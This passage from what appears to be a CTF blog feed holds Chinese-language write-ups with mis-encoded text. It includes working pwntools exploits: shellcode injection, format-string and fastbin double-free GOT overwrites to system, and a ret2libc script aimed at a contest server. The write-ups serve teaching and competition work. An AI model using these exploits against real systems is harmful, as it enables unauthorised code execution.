class="number">0x7D0</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input verify code:"</span>, <span class="number">0L</span>L);</span><br><span class="line">  get_str(src, <span class="number">2018</span>); </span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1999</span> &amp;&amp; src[i]; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !(src[i] &amp; <span class="number">1</span>) &amp;&amp; src[i] != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src); </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"check passed,enjoy!"</span>);</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œå¯ä»¥å¯¹<code>src</code>è¿›è¡Œå†™å…¥ï¼Œç›´æ¥å†™shellcodeå¥½äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo1</span><span class="params">()</span>:</span></span><br><span class="line">    shellcode = asm(shellcraft.sh())</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,<span class="string">'su'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'code:'</span>,shellcode)</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,<span class="string">'sh'</span>)</span><br><span class="line">    p.sendline(<span class="string">'cat /flag'</span>)</span><br></pre></td></tr></table></figure><h3 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²</h3><p>è¾“é”™å‘½ä»¤å°±å¯ä»¥ç›´æ¥è§¦å‘æ¼æ´ï¼Œè¿™é‡Œå¯ä»¥ç”¨æ¥æ³„éœ²ç¨‹åºåŸºå€ï¼ŒlibcåŸºå€å’Œstackåœ°å€<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_elf</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt;&gt;"</span>,<span class="string">"%8$p"</span>)</span><br><span class="line">    init_addr = int(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    init_offset = <span class="number">0x56427404f3c0</span> - <span class="number">0x56427404e000</span></span><br><span class="line">    elf.base = init_addr - init_offset</span><br><span class="line">    success(<span class="string">'elf.base:%s'</span> %hex(elf.base))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt;&gt;"</span>,<span class="string">"%9$p"</span>)</span><br><span class="line">    libc_start_main_addr = int(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    libc_start_main_offset = libc.symbols[<span class="string">"__libc_start_main"</span>]</span><br><span class="line">    libc.base = libc_start_main_addr - libc_start_main_offset - <span class="number">0xf0</span></span><br><span class="line">    success(<span class="string">'libc.base:%s'</span> %hex(libc.base))</span><br></pre></td></tr></table></figure></p><p>ç”±äºå­—ç¬¦ä¸²å­˜åœ¨bssæ®µï¼Œåˆ©ç”¨æ–¹æ³•æ¯”è¾ƒéº»çƒ¦ï¼Œæ€è·¯æ˜¯åˆ©ç”¨stackä¸Šçš„åœ°å€è¿›è¡Œè·³è½¬ï¼Œä¿®æ”¹printf@got.plt<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">leak_elf()</span><br><span class="line">leak_libc()</span><br><span class="line">rbp_addr = leak_stack() - <span class="number">0xe8</span> </span><br><span class="line">success(<span class="string">'rbp_addr:%s'</span> %hex(rbp_addr))</span><br><span class="line"><span class="comment">#step1:overwrite stack to stack  # printf@got.plt 0x202048</span></span><br><span class="line">payload = hn((rbp_addr+<span class="number">0x28</span>) &amp; <span class="number">0xffff</span>,(<span class="number">6</span>+<span class="number">0x5</span>))  <span class="comment"># 0x7ffe2168cb48 -&gt; 0x7ffe2168ca88</span></span><br><span class="line">payload += hn(<span class="number">2</span>,<span class="number">6</span>+<span class="number">0x13</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,payload+<span class="string">'\x00'</span>)</span><br><span class="line"><span class="comment">#step2:overwrite stack to printf@got.plt</span></span><br><span class="line">payload = hhn((elf.got[<span class="string">'printf'</span>] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>),<span class="number">6</span>+<span class="number">0x21</span>)</span><br><span class="line">payload += hn((elf.got[<span class="string">'printf'</span>] &amp; <span class="number">0xffff</span>)-(elf.got[<span class="string">'printf'</span>] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>),<span class="number">6</span>+<span class="number">0x1f</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,payload+<span class="string">'\x00'</span>)</span><br><span class="line"><span class="comment">#step3:overwrite stack to stack</span></span><br><span class="line">payload = hn((rbp_addr+<span class="number">0x40</span>) &amp; <span class="number">0xffff</span>,(<span class="number">6</span>+<span class="number">0x5</span>)) </span><br><span class="line">payload += hn(<span class="number">2</span>,<span class="number">6</span>+<span class="number">0x13</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,payload+<span class="string">'\x00'</span>)</span><br><span class="line"><span class="comment">#step4:overwrite stack to printf@got.plt+2</span></span><br><span class="line">payload = hhn((elf.got[<span class="string">'printf'</span>]+<span class="number">2</span> &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>),<span class="number">6</span>+<span class="number">0x21</span>)</span><br><span class="line">payload += hn((elf.got[<span class="string">'printf'</span>]+<span class="number">2</span> &amp; <span class="number">0xffff</span>)-(elf.got[<span class="string">'printf'</span>]+<span class="number">2</span> &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>),<span class="number">6</span>+<span class="number">0x1f</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,payload+<span class="string">'\x00'</span>)</span><br><span class="line"><span class="comment">#step5:overwrite printf@got.plt to system@plt</span></span><br><span class="line">payload = hhn((libc.symbols[<span class="string">'system'</span>] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>),<span class="number">6</span>+<span class="number">0xa</span>)</span><br><span class="line">payload += hn((libc.symbols[<span class="string">'system'</span>] &amp; <span class="number">0xffff</span>)-(libc.symbols[<span class="string">'system'</span>] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>),<span class="number">6</span>+<span class="number">0x7</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,payload+<span class="string">'\x00'</span>)</span><br></pre></td></tr></table></figure></p><h3 id="fastbin-attach"><a href="#fastbin-attach" class="headerlink" title="fastbin attach"></a>fastbin attach</h3><p>mallocçš„å¤§å°å¯æ§ï¼Œå¯ä»¥ç”¨fastbin dupæ¥ä¿®æ”¹free@got.plt</p><p>ç”±äºå›ºå®šè¾“å…¥è¯»å–é•¿åº¦æ˜¯90ï¼Œå¯ä»¥ç›´æ¥æº¢å‡ºã€‚<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">touch</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt;"</span>,<span class="string">"touch"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Size:"</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">"content:"</span>,content)</span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ls</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt;"</span>,<span class="string">"ls"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt;"</span>,<span class="string">"rm"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo2</span><span class="params">()</span>:</span></span><br><span class="line">leak_elf()</span><br><span class="line">leak_libc()</span><br><span class="line">touch(<span class="number">0x10</span>,<span class="string">'0'</span>) <span class="comment">#0</span></span><br><span class="line">touch(<span class="number">0x10</span>,<span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">touch(<span class="number">0x10</span>,<span class="string">'cat /flag\x00'</span>)</span><br><span class="line">rm(<span class="number">0</span>)</span><br><span class="line">rm(<span class="number">1</span>)</span><br><span class="line">rm(<span class="number">0</span>)</span><br><span class="line">fake = elf.address + <span class="number">0x202018</span> - <span class="number">0x1e</span></span><br><span class="line">touch(<span class="number">0x10</span>,p64(fake))</span><br><span class="line">touch(<span class="number">0x10</span>,<span class="string">'2'</span>)</span><br><span class="line">touch(<span class="number">0x10</span>,<span class="string">'3'</span>)</span><br><span class="line">touch(<span class="number">0x10</span>,<span class="string">'\x00'</span>*<span class="number">0xe</span>+p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">rm(<span class="number">2</span>)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure></p><h3 id="patchæ–¹æ³•"><a href="#patchæ–¹æ³•" class="headerlink" title="patchæ–¹æ³•"></a>patchæ–¹æ³•</h3><h4 id="shellcodeï¼š"><a href="#shellcodeï¼š" class="headerlink" title="shellcodeï¼š"></a>shellcodeï¼š</h4><p>ç›´æ¥ä¿®æ”¹shellcodeçš„è¾“å…¥é•¿åº¦<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input verify code:"</span>, <span class="number">0L</span>L);</span><br><span class="line">get_str(src, <span class="number">16</span>);</span><br></pre></td></tr></table></figure></p><h4 id="double-freeï¼š"><a href="#double-freeï¼š" class="headerlink" title="double freeï¼š"></a>double freeï¼š</h4><p>ä¿®æ”¹æ£€æŸ¥æ ‡è¯†ä½æ ¡éªŒï¼Œé˜²æ­¢double free<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">9</span> &amp;&amp; *(_QWORD *)&amp;used_tag[<span class="number">2</span> * v1] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)file_list[v1]);</span><br><span class="line">  used_tag[v1] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><h4 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼š"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼š" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼š"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼š</h4><p><code>printf</code> æ”¹ <code>puts</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(s2);                              </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" :command not found!"</span>, a2);</span><br></pre></td></tr></table></figure></p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>ä¸çŸ¥é“è¿˜æœ‰æ²¡æœ‰å…¶ä»–çš„åˆ©ç”¨æ–¹æ³•ï¼Œæœ‰å¤§ä½¬çŸ¥é“çš„éº»çƒ¦å‘ŠçŸ¥ã€‚æœ€åè¯´ä¸€å¥ï¼Œåƒåœ¾æ¯”èµ›~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ä»Šå¹´çº¢å¸½æ¯ç»™webé¢˜æ¶å¿ƒåˆ°äº†ï¼Œåˆšå¤‡ä»½çš„ä»£ç å·²ç»æœ‰æŸå›½ä¼çš„3ä¸ªä¸æ­»é©¬ï¼Œä¸çŸ¥é“å¦‚ä½•åšåˆ°è¿™ä¹ˆå¿«çš„ï¼Œé¢˜ç›®è´¨é‡ä¹Ÿå ªå¿§ï¼Œè·Ÿå»å¹´çš„æ²¡æ³•æ¯”ã€‚æ¯”èµ›è¿‡ç¨‹èŠ±å¤ªå¤šæ—¶é—´åœ¨webï¼Œéƒ½æ²¡å¥½å¥½çœ‹çœ‹pwnï¼Œå…¶å®å¾ˆç®€å•ï¼Œè¡€äºT_Tâ€¦.&lt;/p&gt;
&lt;h3 id=&quot;ä¿æŠ¤æƒ…å†µ&quot;&gt;&lt;a href=&quot;#ä¿æŠ¤æƒ…å†µ&quot; cla
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>å¹¿ä¸œçº¢å¸½æ¯2018 writeup</title>
    <link href="https://4f-kira.github.io/2018/05/02/redhat2018/"/>
    <id>https://4f-kira.github.io/2018/05/02/redhat2018/</id>
    <published>2018-05-02T01:32:21.000Z</published>
    <updated>2018-05-02T01:36:18.992Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Not-Only-Wiresharkï¼ˆsolvedï¼‰"><a href="#Not-Only-Wiresharkï¼ˆsolvedï¼‰" class="headerlink" title="Not Only Wiresharkï¼ˆsolvedï¼‰"></a>Not Only Wiresharkï¼ˆsolvedï¼‰</h3><p><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/NotOnlyWireshark_ed63b63425ec3ed09470d8715b208293.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/NotOnlyWireshark_ed63b63425ec3ed09470d8715b208293.zip?pass=null</a><br><strong>hint: tshark</strong><br>æ‰“å¼€æµé‡åŒ…ï¼Œç›´æ¥æŸ¥çœ‹httpæ•°æ®ï¼Œå‘ç°å­˜åœ¨å¾ˆå¤šname=xxxçš„è®¿é—®è®°å½•ï¼Œå°†æ‰€æœ‰16è¿›åˆ¶æå–å‡ºæ¥ã€‚<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> strings 123.pcapng| grep name| grep -oP "name=[0-9A-F]+"| tr -d 'name='|tr -d '\n' &gt; flag</span><br></pre></td></tr></table></figure></p><p>ä¿®å¤zipæ–‡ä»¶å¤´</p><p>å¯†ç æ˜¯ï¼š<code>?id=1128%23</code><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> strings 123.pcapng| grep key</span><br><span class="line">&amp;GET /xss/example4.php?key=?id=1128%23 HTTP/1.1</span><br><span class="line">Referer: http://10.211.55.15/xss/example4.php?key=?id=1128%23</span><br></pre></td></tr></table></figure></p><h3 id="è¿™æ˜¯é“webé¢˜ï¼Ÿï¼ˆsolvedï¼‰"><a href="#è¿™æ˜¯é“webé¢˜ï¼Ÿï¼ˆsolvedï¼‰" class="headerlink" title="è¿™æ˜¯é“webé¢˜ï¼Ÿï¼ˆsolvedï¼‰"></a>è¿™æ˜¯é“webé¢˜ï¼Ÿï¼ˆsolvedï¼‰</h3><p><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/yunCMS_256035f22b73fdb1c90fd7503c4005ed.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/yunCMS_256035f22b73fdb1c90fd7503c4005ed.zip?pass=null</a><br>ç›´æ¥ç”¨Dç›¾æ‰«ä¸€ä¸‹ï¼Œå‘ç°ä¸€ä¸ªjspå¤§é©¬å’Œä¸€ä¸ªå˜å½¢phpä¸€å¥è¯</p><p>æ‰“å¼€jspå¤§é©¬çœ‹åˆ°<code>&lt;Bad way. Get OUT. No000000000flag&gt;</code>ï¼Œä¼°è®¡ä¸åœ¨è¿™é‡Œ</p><p>ç„¶åæ‰“å¼€å˜å½¢phpä¸€å¥è¯ï¼Œå‘ç°ä¸‹é¢æœ‰æç¤ºï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">You eventually found me</span><br><span class="line">I am a hacker from Georgia</span><br><span class="line">You are doing too much food at your upload</span><br><span class="line">Used tshark to make traffic records?</span><br><span class="line">Then you go to the traffic to find me</span><br></pre></td></tr></table></figure></p><p>æ‰“å¼€åŒç›®å½•ä¸‹çš„æµé‡åŒ…<code>78466550-3fc1-11e8-9828-32001505e920.pcapng</code>ï¼Œæ‰¾åˆ°è®¿é—®<code>companytplfiles.php</code>çš„æµé‡ï¼Œå‘ç°é‡Œé¢æœ‰ä¸€ä¸ªjpgå’Œgifï¼Œflagå°±åœ¨gifé‡Œé¢ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print &apos;&apos;.join([chr(x) for x in [102,108,97,103,123,83,48,50,50,121,52,111,114,114,53,125]])</span><br><span class="line">flag&#123;S022y4orr5&#125;</span><br></pre></td></tr></table></figure></p><h3 id="å¬è¯´ä½ ä»¬å–œæ¬¢æ‰‹å·¥çˆ†ç ´ï¼ˆsolvedï¼‰"><a href="#å¬è¯´ä½ ä»¬å–œæ¬¢æ‰‹å·¥çˆ†ç ´ï¼ˆsolvedï¼‰" class="headerlink" title="å¬è¯´ä½ ä»¬å–œæ¬¢æ‰‹å·¥çˆ†ç ´ï¼ˆsolvedï¼‰"></a>å¬è¯´ä½ ä»¬å–œæ¬¢æ‰‹å·¥çˆ†ç ´ï¼ˆsolvedï¼‰</h3><p>flag{}å†…è‹±æ–‡å­—æ¯ä¸ºå¤§å†™å½¢å¼<br><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/OS_038c9291c8039792d1aad140f6664671.iso?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/OS_038c9291c8039792d1aad140f6664671.iso?pass=null</a><br>æ ¹æ®æç¤ºï¼Œåº”è¯¥æ˜¯æ›¼å½»æ–¯ç‰¹ç ï¼Œä¸è¿‡æœ¬é¢˜çš„ç¼–ç ä¸æ˜¯æ ‡å‡†ç¼–ç ï¼Œéœ€è¦è„‘æ´<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">a = <span class="string">'123654AAA678876303555111AAA77611A321'</span></span><br><span class="line"><span class="comment"># å¥¹ç°åœ¨ä½åœ¨F5è¡—åŒºF5è¡—é“07å·å¹¢</span></span><br><span class="line">f =  <span class="string">'0'</span>+bin(int(<span class="string">'0x'</span>+a,<span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> f,len(f)</span><br><span class="line"></span><br><span class="line">f2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">142</span>,<span class="number">2</span>):</span><br><span class="line"><span class="keyword">if</span> f[i:i+<span class="number">2</span>] == <span class="string">'01'</span>:</span><br><span class="line">f2 += <span class="string">'0'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">f2 += <span class="string">'1'</span></span><br><span class="line"><span class="keyword">print</span> f2,len(f2)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">71</span>,<span class="number">8</span>):</span><br><span class="line">tmp = f2[i:i+<span class="number">8</span>][::<span class="number">-1</span>]</span><br><span class="line">flag += hex(int(tmp[:<span class="number">4</span>],<span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line">flag += hex(int(tmp[<span class="number">4</span>:],<span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> flag.upper()</span><br></pre></td></tr></table></figure></p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="game-serverï¼ˆsolvedï¼‰"><a href="#game-serverï¼ˆsolvedï¼‰" class="headerlink" title="game serverï¼ˆsolvedï¼‰"></a>game serverï¼ˆsolvedï¼‰</h3><p>nc 123.59.138.180 20000<br><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/game_server_ccc0d7c007817105ab5b9d10c6f1c8b1.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/game_server_ccc0d7c007817105ab5b9d10c6f1c8b1.zip?pass=null</a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8048637</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+7h] [ebp-111h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+107h] [ebp-11h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [esp+108h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// [esp+10Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to my game server"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"First, you need to tell me you name?"</span>);</span><br><span class="line">  fgets(byte_804A180, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v4 = <span class="built_in">strrchr</span>(byte_804A180, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    *v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello %s\n"</span>, byte_804A180);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What's you occupation?"</span>);</span><br><span class="line">  fgets(byte_804A080, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v4 = <span class="built_in">strrchr</span>(byte_804A080, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    *v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Well, my noble %s\n"</span>, byte_804A080);</span><br><span class="line">  nbytes = <span class="built_in">snprintf</span>(</span><br><span class="line">             &amp;s,</span><br><span class="line">             <span class="number">0x100</span>u,</span><br><span class="line">             <span class="string">"Our %s is a noble %s. He is come from north and well change out would."</span>,</span><br><span class="line">             byte_804A180,</span><br><span class="line">             byte_804A080);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Here is you introduce"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you want to edit you introduce by yourself?[Y/N]"</span>);</span><br><span class="line">  v2 = getchar();</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">89</span> )</span><br><span class="line">    read(<span class="number">0</span>, &amp;s, nbytes);         <span class="comment">//æ­¤å¤„å­˜åœ¨æ ˆæº¢å‡º</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"name : %s\noccupation : %s\nintroduce : %s\n"</span>, byte_804A180, byte_804A080, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æœ€åä¿®æ”¹<code>introduce</code>çš„åœ°æ–¹å­˜åœ¨æ˜æ˜¾æ ˆæº¢å‡ºï¼Œç¨‹åºåªå¼€äº†NXï¼Œç›´æ¥åˆ©ç”¨<code>puts</code>è¿›è¡Œæ³„éœ²å‡½æ•°åœ°å€ï¼Œç„¶åæŸ¥æ‰¾å¯¹åº”çš„libcï¼Œè®¡ç®—<code>system</code>åç§»getshell<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>) </span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">remote_addr = <span class="string">'123.59.138.180'</span></span><br><span class="line">remote_port = <span class="number">20000</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    p = process(<span class="string">'./pwn2'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(remote_addr,remote_port)</span><br><span class="line">    libc = ELF(<span class="string">'./libc6-i386_2.23-0ubuntu10_amd64.so'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line"></span><br><span 